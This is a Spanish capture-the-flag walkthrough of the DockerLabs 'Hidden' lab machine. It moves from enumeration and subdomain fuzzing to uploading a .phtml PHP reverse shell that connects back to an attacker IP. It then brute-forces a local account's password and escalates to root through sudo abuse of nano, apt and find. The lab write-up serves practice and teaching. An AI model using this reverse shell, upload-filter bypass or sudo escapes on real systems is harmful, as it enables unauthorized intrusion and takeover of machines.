# Hidden DockerLabs (Intermediate)

### Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip hidden.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_deploy.sh hidden.tar
```

Info:

```
Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

### Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-17 09:06 EDT
Nmap scan report for hidden.lab (172.17.0.2)
Host is up (0.000034s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: HIDDEN - Tu Tienda de Caf\xC3\xA9s
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: Host: localhost

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.42 seconds
```

Vemos que hay una pagina web, pero si nos metemos ha ella no carga correctamente, pero vemos un dominio, por lo que lo resolveremos haciendo lo siguiente.

```shell
nano /etc/hosts

#Dentro del nano
<IP>        hidden.lab
```

Lo guardamos y si volvemos a cargar la pagina con el dominio, veremos que carga todo correctamente.

```
URL = http://hidden.lab/
```

Pero no veremos gran cosa, por lo que fuzzearemos mas profundo.

## Gobuster

```shell
gobuster dir -u http://hidden.lab/ -w <WORDLIST> -x html,php,txt -t 100 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://hidden.lab/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,html,php
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess.txt        (Status: 403) [Size: 275]
/.htpasswd.php        (Status: 403) [Size: 275]
/.htaccess.html       (Status: 403) [Size: 275]
/LICENSE.txt          (Status: 200) [Size: 1456]
/.htaccess            (Status: 403) [Size: 275]
/.htpasswd.txt        (Status: 403) [Size: 275]
/.htpasswd.html       (Status: 403) [Size: 275]
/.htaccess.php        (Status: 403) [Size: 275]
/.htpasswd            (Status: 403) [Size: 275]
/about.html           (Status: 200) [Size: 9703]
/contact.html         (Status: 200) [Size: 11680]
/css                  (Status: 200) [Size: 1133]
/img                  (Status: 200) [Size: 4245]
/index.html           (Status: 200) [Size: 10483]
/js                   (Status: 200) [Size: 923]
/lib                  (Status: 200) [Size: 1539]
/mail                 (Status: 200) [Size: 1370]
/menu.html            (Status: 200) [Size: 11846]
/reservation.html     (Status: 200) [Size: 11786]
/service.html         (Status: 200) [Size: 10926]
/server-status        (Status: 403) [Size: 275]
/testimonial.html     (Status: 200) [Size: 10335]
Progress: 81876 / 81880 (100.00%)
===============================================================
Finished
===============================================================
```

Veremos mucha informacion pero poca cosa, ya que utiliza dominios, podemos intentar identificar si tuviera algun subdominio de la siguiente forma.

## ffuf (subdominio)

```shell
ffuf -c -t 200 -w <WORDLIST> -H "Host: FUZZ.hidden.lab" -u http://hidden.lab/ -fw 18
```

Info:

```

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://hidden.lab/
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Header           : Host: FUZZ.hidden.lab
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 18
________________________________________________

dev                     [Status: 200, Size: 1653, Words: 550, Lines: 58, Duration: 0ms]
:: Progress: [20469/20469] :: Job [1/1] :: 188 req/sec :: Duration: [0:00:13] :: Errors: 0 ::
```

Vemos que encontramos un `subdominio` llamado `dev` por lo que haremos lo siguiente.

Editaremos el `hosts` para añadir ese `subdominio`.

```shell
nano /etc/hosts

#Dentro del nano
<IP>         hidden.lab dev.hidden.lab
```

Lo guardamos y ahora iremos a la siguiente URL.

```
URL = http://dev.hidden.lab/
```

Por lo que vemos hay una pagina en la que te pide que envies un CV, pero veremos a ver si el subir archivos puede ser vulnerado de la siguiente forma.

## Reverse Shell

Primero vamos a ver donde se alojan los archivos.

```shell
gobuster dir -u http://dev.hidden.lab/ -w <WORDLIST> -x html,php,txt -t 100 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://dev.hidden.lab/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess.txt        (Status: 403) [Size: 279]
/.htaccess.html       (Status: 403) [Size: 279]
/.htpasswd.php        (Status: 403) [Size: 279]
/.htpasswd.txt        (Status: 403) [Size: 279]
/.htpasswd.html       (Status: 403) [Size: 279]
/.htaccess.php        (Status: 403) [Size: 279]
/.htaccess            (Status: 403) [Size: 279]
/.htpasswd            (Status: 403) [Size: 279]
/index.html           (Status: 200) [Size: 1653]
/server-status        (Status: 403) [Size: 279]
/upload.php           (Status: 200) [Size: 74]
/uploads              (Status: 200) [Size: 946]
Progress: 81876 / 81880 (100.00%)
===============================================================
Finished
===============================================================
```

Vemos que se alojan en `/uploads` por lo que ahora intentaremos subir un archivo `.php` con una reverse shell, solo que nos dice que no se admiten ese tipo de formatos, por lo que haremos el siguiente tipo de extension para que funcione.

```shell
nano shell.phtml

#Dentro del nano
<?php
$sock=fsockopen("<IP>",<PORT>);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
?>
```

Lo guardamos y ahora se subira como otro tipo de extension para que no lo bloque solo que seguira haciendo caso a la extension de `php` para que funcione.

Una vez que lo hayamos subido con la extension de `.phtml` iremos a la siguiente URL.

```
URL = http://dev.hidden.lab/uploads/
```

Y aqui encontraremos nuestro archivo, por lo que antes de darle estaremos a la escucha.

```shell
nc -lvnp <PORT>
```

Y hecho eso, le daremos al archivo, si volvemos a donde teniamos la escucha obtendremos una shell de `www-data`.

Info:

```
connect to [192.168.5.145] from (UNKNOWN) [172.17.0.2] 53256
whoami
www-data
```

Sanitizamos la shell (TTY).

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

## Escalate user cafetero

Como no tenemos ssh para hacer fuerza bruta desde fuera, lo haremos desde dentro con el siguiente script.

URL = https://github.com/Maalfer/Sudo\_BruteForce/blob/main/Linux-Su-Force.sh

Nos lo copiamos y pegamos en el `/tmp` para ejecutarlo desde ahi, tambien copiaremos las 1000 primeras palabras del `rockyou.txt` para copiarlo en un `.txt` que crearemos dentro de la maquina para utilizarlo.

> Copiar el diccionario

```shell
head -1000 /usr/share/wordlists/rockyou.txt
```

Lo pegamos en un archivo dentro de la maquina.

```shell
nano /tmp/dic.txt

#Dentro del nano
<PASTE_1000_ROCKYOU.TXT>
```

Lo guardamos y tambien crearemos otro archivo.

```shell
nano script.sh

#Dentro del nano
<PASTE_SCRIPT_SU_FORCE>
```

Lo guardamos y lo ejecutamos de la siguiente forma, elegiremos a un usuario.

```shell
bash script.sh cafetero dic.txt
```

Info:

```
Contraseña encontrada para el usuario cafetero: 123123
```

Vemos las credenciales del usuario `cafetero`, por lo que cambiaremos a el.

```shell
su cafetero
```

Metemos la contraseña obtenida y ya seremos el.

## Escalate user john

Si hacemos `sudo -l` veremos lo siguiente.

```
Matching Defaults entries for cafetero on c334669636c3:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User cafetero may run the following commands on c334669636c3:
    (john) NOPASSWD: /usr/bin/nano
```

Podemos ejecutar como `john` el binario `nano` por lo que haremos lo siguiente.

URL = https://gtfobins.github.io/gtfobins/nano/#sudo

```shell
sudo -u john nano

#Dentro del nano
^R^X #(Esto te habrira una linea de comandos dentro del nano)
reset; sh 1>&0 2>&0
```

A eso ultimo le damos a `ENTER` y se nos habria ejecutado ese comando, por lo que hacemos.

```shell
clear
/bin/bash
```

Y habremos limpiado la terminal que se veia mal y tendremos una shell mejor.

## Escalate user bobby

Si hacemos `sudo -l` veremos lo siguiente.

```
Matching Defaults entries for john on c334669636c3:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User john may run the following commands on c334669636c3:
    (bobby) NOPASSWD: /usr/bin/apt
```

Por lo que podremos ejecutar como `bobby` el binario `apt`, por lo que haremos lo siguiente.

URL = https://gtfobins.github.io/gtfobins/apt/#sudo

```shell
sudo -u bobby apt changelog apt
```

Y dentro del entorno del `apt` escribimos lo siguiente a mano.

```shell
!/bin/bash
```

Con esto obtendremos la shell del usuario `bobby`.

## Escalate Privileges

Si hacemos `sudo -l` veremos lo siguiente.

```
Matching Defaults entries for bobby on c334669636c3:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User bobby may run the following commands on c334669636c3:
    (root) NOPASSWD: /usr/bin/find
```

Vemos que podemos ejecutar como `root` el binario `find` por lo que haremos lo siguiente.

URL = https://gtfobins.github.io/gtfobins/find/#sudo

```shell
sudo find . -exec /bin/sh \; -quit
```

Y despues.

```shell
/bin/bash
```

Por lo que ya seremos `root` y habriamos terminado la maquina.
